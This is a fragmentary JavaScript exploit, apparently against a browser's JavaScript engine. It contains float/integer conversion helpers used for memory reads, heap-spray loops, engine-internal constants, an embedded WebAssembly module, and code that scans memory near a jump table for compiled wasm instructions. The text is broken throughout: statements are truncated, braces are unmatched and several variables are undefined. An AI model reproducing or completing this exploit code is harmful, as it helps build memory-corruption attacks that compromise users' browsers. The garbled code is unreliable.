function f2i(f){f64[0]=f;return u64[0];}
function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe,PIN=0x1080011;
const marker={mmm:1},marker2={zzz:2};

for(var i=0;i<objB.length;i++)objB[i]=marker;

  new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
objB[4]=wasmI;

log("UA: "+navigator.userAgent);

trash(230);trash(230);

    try{const v=f2i(m[jtK+i]);jt.push(v.toString(16));}catch(e){jt.push("E");break;}
  }
  log("JT:"+jt.join(","));
  // Search for mov eax, 42 pattern (b8 2a 00 00 00) in nearby QWORDs
  // As a QWORD containing b82a000000: look for value containing 0x0000002ab8
  // Actually scan byte-by-byte through the QWORDs
  let found=-1;
  for(let i=0;i<32;i++){
    try{
      const v=f2i(m[jtK+i]);

      const b=[];
      for(let j=0;j<8;j++)b.push(Number((v>>BigInt(j*8))&0xffn));

    let nv=old;
